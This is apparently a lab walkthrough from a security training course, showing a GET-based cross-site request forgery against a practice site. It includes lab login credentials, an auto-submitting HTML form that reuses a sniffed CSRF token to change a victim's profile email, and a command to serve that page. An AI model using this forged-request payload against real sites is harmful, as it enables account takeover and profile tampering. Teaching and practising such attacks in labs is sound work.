# Cross-Site Request Forgery (GET-based)

Navigate to `http://csrf.htb.net` and log in to the application using the credentials below:

* Email: heavycat106
* Password: rocknrol

This is an account that we created to look at the application's functionality.

Now, browse Julie Rogers' profile and click _Save_. You should see the below.

<figure><img src="../../../.gitbook/assets/image (1153).png" alt=""><figcaption></figcaption></figure>

Activate burp suite's proxy (_Intercept On_) and configure your browser to go through it. Now click _Save_ again.

You should see the below.

<figure><img src="../../../.gitbook/assets/image (1154).png" alt=""><figcaption></figcaption></figure>

Let us simulate an attacker on the local network that sniffed the abovementioned request and wants to deface Julie Rogers' profile through a CSRF attack. Of course, they could have just performed a session hijacking attack using the sniffed session cookie.

First, create and serve the below HTML page. Save it as `notmalicious_get.html`

Code: html

```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

Notice that the CSRF token's value above is the same as the CSRF token's value in the captured/"sniffed" request.

You can serve the page above from your attacking machine as follows.

```shell-session
eldeim@htb[/htb]$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

While still logged in as Julie Rogers, open a new tab and visit the page you are serving from your attacking machine `http://<VPN/TUN Adapter IP>:1337/notmalicious_get.html`. You will notice that Julie Rogers' profile details will change to the ones we specified in the HTML page you are serving.

<figure><img src="../../../.gitbook/assets/image (1155).png" alt=""><figcaption></figcaption></figure>
